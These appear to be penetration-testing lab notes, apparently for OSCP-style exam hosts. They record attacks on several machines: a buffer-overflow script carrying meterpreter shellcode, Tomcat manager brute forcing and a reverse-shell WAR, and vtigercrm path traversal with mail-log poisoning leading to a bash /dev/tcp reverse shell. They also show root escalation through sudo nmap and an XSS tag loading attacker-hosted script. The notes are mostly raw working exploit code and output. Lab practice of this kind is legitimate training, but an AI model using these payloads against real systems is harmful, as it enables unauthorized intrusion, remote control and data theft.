#payload += "\xbe\x2f\xa6\x3f\xb4\x77\xab\xbe\x19\x0c\xd7\x4b\x9c"
#payload += "\xc2\x51\x0f\xbb\xc6\x3a\xcb\xa2\x5f\xe7\xba\xdb\xbf"
#payload += "\x48\x62\x7e\xb4\x65\x77\xf3\x97\xe1\xb4\x3e\x27\xf2"
#payload += "\xd2\x49\x54\xc0\x7d\xe2\xf2\x68\xf5\x2c\x05\x8e\x2c"
#payload += "\x88\x99\x71\xcf\xe9\xb0\xb5\x9b\xb9\xaa\x1c\xa4\x51"
#payload += "\x2a\xa0\x71\xcf\x22\x07\x2a\xf2\xcf\xf7\x9a\xb2\x7f"
#payload += "\x90\xf0\x3c\xa0\x80\xfa\x96\xc9\x29\x07\x19\xd2\xac"
#payload += "\x8e\xff\x76\xbf\xc6\xa8\xee\x7d\x3d\x61\x89\x7e\x17"
#payload += "\xd9\x3d\x36\x71\xde\x42\xc7\x57\x48\xd4\x4c\xb4\x4c"
#payload += "\xc5\x52\x91\xe4\x92\xc5\x6f\x65\xd1\x74\x6f\xac\x81"
#payload += "\x15\xe2\x2b\x51\x53\x1f\xe4\x06\x34\xd1\xfd\xc2\xa8"
#payload += "\x48\x54\xf0\x30\x0c\x9f\xb0\xee\xed\x1e\x39\x62\x49"
#payload += "\x05\x29\xba\x52\x01\x1d\x12\x05\xdf\xcb\xd4\xff\x91"
#payload += "\xa5\x8e\xac\x7b\x21\x56\x9f\xbb\x37\x57\xca\x4d\xd7"
#payload += "\xe6\xa3\x0b\xe8\xc7\x23\x9c\x91\x35\xd4\x63\x48\xfe"
#payload += "\xf4\x81\x58\x0b\x9d\x1f\x09\xb6\xc0\x9f\xe4\xf5\xfc"
#payload += "\x23\x0c\x86\xfa\x3c\x65\x83\x47\xfb\x96\xf9\xd8\x6e"
#payload += "\x98\xae\xd9\xba"
#msfvenom -p windows/meterpreter/reverse_tcp lhost= lport=  -f py -b '\x00'
buf =  ""
buf += "\xb8\xad\xe8\x27\xf3\xda\xcf\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x5b\x83\xea\xfc\x31\x42\x10\x03\x42\x10\x4f"
buf += "\x1d\xdb\x1b\x0d\xde\x24\xdc\x71\x56\xc1\xed\xb1\x0c"
buf += "\x81\x5e\x01\x46\xc7\x52\xea\x0a\xfc\xe1\x9e\x82\xf3"
buf += "\x42\x14\xf5\x3a\x52\x04\xc5\x5d\xd0\x56\x1a\xbe\xe9"
buf += "\x99\x6f\xbf\x2e\xc7\x82\xed\xe7\x8c\x31\x02\x83\xd8"
buf += "\x89\xa9\xdf\xcd\x89\x4e\x97\xec\xb8\xc0\xa3\xb7\x1a"
buf += "\xe2\x60\xcc\x12\xfc\x65\xe8\xed\x77\x5d\x87\xef\x51"
buf += "\xaf\x68\x43\x9c\x1f\x9b\x9d\xd8\x98\x43\xe8\x10\xdb"
buf += "\xfe\xeb\xe6\xa1\x24\x79\xfd\x02\xaf\xd9\xd9\xb3\x7c"
buf += "\xbf\xaa\xb8\xc9\xcb\xf5\xdc\xcc\x18\x8e\xd9\x45\x9f"
buf += "\x41\x68\x1d\x84\x45\x30\xc6\xa5\xdc\x9c\xa9\xda\x3f"
buf += "\x7f\x16\x7f\x4b\x92\x43\xf2\x16\xfb\xa0\x3f\xa9\xfb"
buf += "\xae\x48\xda\xc9\x71\xe3\x74\x62\xfa\x2d\x82\xf3\xec"
buf += "\xcd\x5c\xbb\x7c\x30\x5d\xbc\x55\xf7\x09\xec\xcd\xde"
buf += "\x31\x67\x0d\xde\xe7\x12\x07\x48\x02\xe8\x17\xe0\x7a"
buf += "\xec\x17\xd7\x7f\x79\xf1\x47\xd0\x29\xad\x27\x80\x89"
buf += "\x1d\xc0\xca\x05\x42\xf0\xf4\xcf\xeb\x9b\x1a\xa6\x44"
buf += "\x34\x82\xe3\x1e\xa5\x4b\x3e\x5b\xe5\xc0\xcb\x9c\xa8"
buf += "\x20\xb9\x8e\xdd\x56\x41\x4e\x1e\xf3\x41\x24\x1a\x55"
buf += "\x15\xd0\x20\x80\x51\x7f\xda\xe7\xe1\x87\x24\x76\xd0"
buf += "\xfc\x13\xec\x5c\x6a\x5c\xe0\x5c\x6a\x0a\x6a\x5d\x02"
buf += "\xea\xce\x0e\x37\xf5\xda\x22\xe4\x60\xe5\x12\x59\x22"
buf += "\x8d\x98\x84\x04\x12\x62\xe3\x16\x55\x9c\x76\x31\xfe"
buf += "\xf5\x88\x01\xfe\x05\xe2\x81\xae\x6d\xf9\xae\x41\x5e"
buf += "\x02\x65\x0a\xf6\x89\xe8\xf8\x67\x8e\x20\x5c\x36\x8f"
buf += "\xc7\x45\xc9\xea\xa8\x7a\x2a\x0b\xa1\x1e\x2a\x0c\xcd"
buf += "\x20\x16\xdb\xf4\x56\x59\xd8\x42\x78\x44\xf4\xbe\x11"
buf += "\xd1\x9d\x02\x7c\xe2\x48\x40\x79\x61\x78\x39\x7e\x79"
buf += "\x09\x3c\x3a\x3d\xe2\x4c\x53\xa8\x04\xe2\x54\xf9"

payload +=buf

exploit = "AAAA:" + "B"*442 + "\xeb\x64" + (nop*2) + ret + (nop*266) +"\xeb\x10" + (nop*109) + payload + (nop * (400-len(payload)))

request  = "GET / HTTP/1.1\r\n" + "Host: " + rhost + ":" + str(rport) + "\r\n" + "Authorization: Basic " + base64.b64encode(exploit) + "\r\n\r\n"

print ("Attacking " + rhost + ":" + str(rport))

#Connect to the target
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rhost,rport))
#Send exploit
s.send(request)
s.close()

print ("Try to connect on port 9989.")
```

```shell
cat proof.txt
itype proof.txt
b786e69b9cf7380e2e08321c6fc17ae

declare
  f utl_file.file_type;
  s varchar(200);
begin
  f := utl_file.fopen('c:\\', 'boot.ini', 'R');
  utl_file.get_line(f, s);
  utl_file.fclose(f);
  dbms_output.put_line(s);
end;

declare
  f utl_file.file_type;
  s varchar(200) :=  'heel';
begin
  f := utl_file.fopen('TEMP_DIR', 'hi.txt', 'w');
  utl_file.put_line(f, s);
  utl_file.fclose(f);
end
```

# 10.11.1.209

https://ionize.com.au/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol/

```bash
ProxyRequests Off

# Only allow localhost to proxy requests

<Proxy *>
Order deny,allow
Deny from all
Allow from localhost
</Proxy>

# Change the IP address in the below lines to the remote servers IP address hosting the Tomcat instance

ProxyPass                 / ajp://192.168.109.134:8009/
ProxyPassReverse    / ajp://192.168.109.134:8009/
```

msf5 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 auxiliary(scanner/http/tomcat_mgr_login) > set rport 80
rport => 80
msf5 auxiliary(scanner/http/tomcat_mgr_login) > set thread 10
thread => 10
msf5 auxiliary(scanner/http/tomcat_mgr_login) > set threads 10
threads => 10

[-] 127.0.0.1:80 - LOGIN FAILED: tomcat:role1 (Incorrect)
[-] 127.0.0.1:80 - LOGIN FAILED: tomcat:root (Incorrect)

[+] 127.0.0.1:80 - Login Successful: tomcat:tomcat

msfvenom -p java/meterpreter/reverse_tcp lhost=10.11.0.104 lport=4444 -f war -o shell.war
Payload size: 6255 bytes
Final size of war file: 6255 bytes
Saved as: shell.war



lmeterpreter > download /Desktop/proof.txt proof.txt
[*] Downloading: /Desktop/proof.txt -> proof.txt
[*] Downloaded 33.00 B of 33.00 B (100.0%): /Desktop/proof.txt -> proof.txt
[*] download   : /Desktop/proof.txt -> proof.txt
meterpreter >

root@ens:~/oscp/209# cat proof.txt
9947c7f0524965d901fb6f43b1274695



# 10.11.1.217

https://www.exploit-db.com/exploits/37637

https://10.11.1.217/vtigercrm/graph.php?current_language=../../../../../../../../etc/passwd%00&module=Accounts&action

25/tcp   open  smtp?
|_smtp-commands: hotline.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,

```
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
```

send mail to asterick


Connected to 10.11.1.217.
Escape character is '^]'.
220 hotline.localdomain ESMTP Postfix
ehlo
501 Syntax: EHLO hostname
ehlo hotline
250-hotline.localdomain
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
mail from:<hotline>
250 2.1.0 Ok
rcpt to: <asterisk@localhost>
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>

https://10.11.1.217/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&module=Accounts&action$cmd=ls

bash-3.2$ sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper

POST /vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&module=Accounts&action&cmd=bash+-i>%26+/dev/tcp/10.11.0.104/8000+0>%261 HTTP/1.1

Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
cd /root
ls
install.log
install.log.syslog
proof.txt
cat proof.txt
ffb5d84a211ae8398d6ae474f2242af3

# 10.11.1.218

**Niky:** Hello, please leave me a message on this board. I
monitor this page frequently and will reply as soon as it is possible. 
Your messages will be deleted from the board after I have viewed it and 
every time you log in (due to privacy settings). Attention Jeff:
I have changed my IP to 10.1.1.224
Thank you for the suggestion.

```
"><script src='http://10.11.0.104/a.js'></script>
```

